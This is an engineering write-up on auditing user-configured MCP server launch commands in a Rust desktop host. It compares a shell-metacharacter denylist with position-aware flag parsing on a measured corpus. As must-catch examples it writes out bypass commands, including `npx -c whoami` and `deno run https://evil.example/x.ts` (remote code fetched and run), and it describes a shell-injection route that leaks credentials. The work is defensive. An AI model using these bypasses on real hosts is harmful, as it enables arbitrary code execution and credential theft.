---
layer: application
type: application
subject: mcp-tools
technique: command-audit-by-position
stack: rust
status: forged
verified_on: 2026-09-17
verified_against: rust@1.80
applied: code
ab_verdict: better
proof: measured-corpus
---

<!-- version witness: the project declares rust-version = "1.80.0" in its own manifest; the gate ran on rustc 1.97.1 -->

# Auditing a server-launch command by position, in a Rust desktop host

The gate is one pure function on the spawn path: it takes the `command` string
a user configured for a stdio server, returns the token vector on success, and
`spawn_mcp_process` refuses to launch on an error. Before this change it did
four things, all of them pattern matching:

1. refuse any of sixteen shell metacharacters **anywhere** in the string;
2. split on whitespace and match the first token's file stem against an
   eleven-entry runner allow-list;
3. for **every** remaining token, refuse it if it `starts_with` one of seven
   remote-URL prefixes;
4. for container runners, match a flag-name list of host-escape options.

Step 1 is load-bearing rather than defence-in-depth, and the file says so: the
spawn hands `/C` plus each token to the platform shell, which re-parses them.
An executed experiment recorded in the same comment block had already shown
that a quote character survives argv quoting into that shell and chains a
second command, and that an environment reference expands out of the child's
environment — which this host populates with decrypted credentials.

## What the corpus found

41 commands, every one taken from live usage: the `.mcp.json` files and host
config on the development machine, the fleet's own package scripts, hook
configs and docs, this gate's existing tests, and two commands run in a
terminal to confirm they execute. Labels — **must-allow** (21) and
**must-catch** (20) — were assigned from each row's syntactic role before any
arm ran.

| arm | must-catch refused | must-allow admitted | live-config admitted | transport-class refused |
| --- | --- | --- | --- | --- |
| A — the shipped character denylist | 10/20 | 19/21 | 6/6 | 3/3 |
| B1 — position only, denylist deleted | 17/20 | 21/21 | 6/6 | **0/3** |
| B2 — position plus the transport rule | **20/20** | 20/21 | 6/6 | 3/3 |

Arm A's ten misses are all positional, and three of them matter most:

- `node -e 0` and `node -p process.version` are real commands from the fleet's
  own scripts. A code-string flag with a one-token operand carries no
  metacharacter, so the scan admits it.
- `npx -c whoami` and `npx --call hostname` were **run on the machine** and
  printed the user name and the host name. `-c` on that runner executes its
  operand in the package manager's script shell, so an allow-listed runner
  becomes arbitrary program execution with nothing for a character scan to see.
- `npx --package=https://…` and `uvx --from=https://…` pass step 3 because the
  token starts with the flag name, not with the scheme — while
  `npx --registry=https://…`, which step 3 *was* designed to let through,
  differs only in that its operand is read rather than run.

Arm A also refused two real commands: a server launch whose own endpoint
argument is a URL, and a command whose path operand contains an environment
reference and quotes.

## The shape that shipped

Keyed on the program's file stem, four tables and one verb list:

```rust
fn code_string_flags(stem: &str) -> &'static [&'static str] {
    match stem {
        "python" | "python3" => &["-c"],
        "node" | "bun" | "deno" => &["-e", "--eval", "-p", "--print"],
        "npx" => &["-c", "--call"],
        _ => &[],
    }
}
```

`-c` is in the first arm and deliberately not in the second: on that runtime
`-c` is `--check`, which parses and does not run, and two real fleet commands
use it. A spelling-keyed set refuses them.

The scan then walks the token vector once. A flag is split on the first `=` so
the **name** is matched exactly — prefix matching over the whole token is what
let the dangerous form past — and:

- a code-string flag refuses immediately, whatever its operand;
- a code-source flag (`-p`/`--package`, `--from`/`--with`, `-r`/`--require`/
  `--import`, `--entrypoint`) resolves its operand, inline or next, and refuses
  a remote spec there, plus an `--entrypoint` naming a shell;
- a value-only flag (`--registry`, `--cache`, `--index-url`, …) consumes its
  operand without judging it;
- the first bare operand that is not a declared verb is the entry spec, and a
  remote spec there is refused; every bare operand after it is data.

The verb list cost a real defect on the first run: with `run` absent for one
runtime, `deno run https://evil.example/x.ts` landed the URL in the data slot
and the gate admitted it — a row arm A had caught. Fixing the table is what
took B2 from 19/20 to 20/20.

## The clause that is not positional

The last thing the function does is apply the original metacharacter set,
under a `transport_reparses` parameter that production passes as `true`:

```rust
fn validate_mcp_command(command: &str) -> Result<Vec<String>, AppError> {
    validate_mcp_command_positional(command, true)
}
```

B1 exists to justify that. Deleting the character set — the literal reading of
"pattern matching cannot make that distinction" — admitted every real command
(21/21, the best floor of the three arms) and lost all three
transport-class rows, two of which are the constructs the 2026-08-15 experiment
demonstrated. On a transport that re-parses, position is not a property the
executor honours.

## Controls

- **Positive control.** A `#[should_panic]` test asserts that arm A refuses the
  whole must-catch set. It panics — 10 of 20 — so the corpus is provably able
  to go red against the shipped gate, in the same run that reports the verdict.
- **Negative control on the target.** Emptying every `code_string_flags` arm
  turned the target assertion red (`B2 must refuse the whole must-catch set`).
- **Negative control on the floor.** Replacing arm B2 with a function that
  returns an error for every input turned the floor assertion red
  (`B2 must admit at least as many real commands as A (0 vs 19)`). The floor is
  a floor.

## What is still open here

The runner allow-list still admits general-purpose package runners, so a
published-but-poisoned package name is admitted by construction; the file's own
comment names the per-command consent gate as the only close, and it is still a
follow-up. The verb and flag tables cover the eleven allow-listed runners and
nothing else, and an unlisted program's first bare operand is treated as the
entry spec — conservative, and written down rather than assumed.
